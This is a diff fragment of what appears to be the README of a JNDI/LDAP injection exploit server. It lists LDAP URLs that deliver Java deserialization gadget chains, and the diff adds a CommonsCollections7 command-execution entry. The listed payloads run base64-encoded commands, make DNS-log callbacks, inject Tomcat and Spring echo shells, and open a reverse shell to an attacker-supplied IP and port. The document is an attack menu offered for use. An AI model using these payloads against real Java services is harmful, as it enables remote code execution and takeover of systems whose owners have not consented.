@@ -60,6 +60,7 @@ Supported LADP Queries：
     ldap://0.0.0.0:1389/Deserialization/CommonsCollectionsK1/Dnslog/[domain]
     ldap://0.0.0.0:1389/Deserialization/CommonsCollectionsK2/Command/Base64/[base64_encoded_cmd]
     ldap://0.0.0.0:1389/Deserialization/CommonsCollections6/Command/Base64/[base64_encoded_cmd]
+    ldap://0.0.0.0:1389/Deserialization/CommonsCollections7/Command/Base64/[base64_encoded_cmd]
     ldap://0.0.0.0:1389/Deserialization/CommonsBeanutils1/ReverseShell/[ip]/[port]  ---windows NOT supported
     ldap://0.0.0.0:1389/Deserialization/CommonsBeanutils2/TomcatEcho
     ldap://0.0.0.0:1389/Deserialization/C3P0/SpringEcho
